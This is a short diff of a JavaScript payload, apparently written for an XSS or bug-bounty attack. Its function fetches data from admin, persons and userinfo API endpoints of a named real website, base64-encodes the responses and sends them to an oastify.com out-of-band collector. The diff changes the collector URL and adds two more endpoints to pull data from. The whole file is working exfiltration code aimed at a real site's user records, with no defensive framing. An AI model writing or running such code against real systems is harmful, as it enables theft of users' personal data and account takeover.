@@ -21,8 +21,8 @@ function fetchEncodeAndSend(originalUrl, targetUrlBase) {
         .catch(error => console.error('Error in fetching or encoding:', error));
 }
 
-// Usage example
-const originalDataUrl = 'https://my.daryakenar.ir/api/Admin/Users';  // URL where initial data is fetched from
-const targetUrlBase = 'https://v3zercz6vj1ycza5jqal548b228twokd.oastify.com';  // Base URL where you send the base64 encoded data
+const targetUrlBase = 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com';  // Base URL where you send the base64 encoded data
 
-fetchEncodeAndSend(originalDataUrl, targetUrlBase);
+fetchEncodeAndSend('https://my.daryakenar.ir/api/Admin/Users', targetUrlBase);
+fetchEncodeAndSend('https://my.daryakenar.ir/api/Persons', targetUrlBase);
+fetchEncodeAndSend('https://my.daryakenar.ir/connect/userinfo', targetUrlBase);
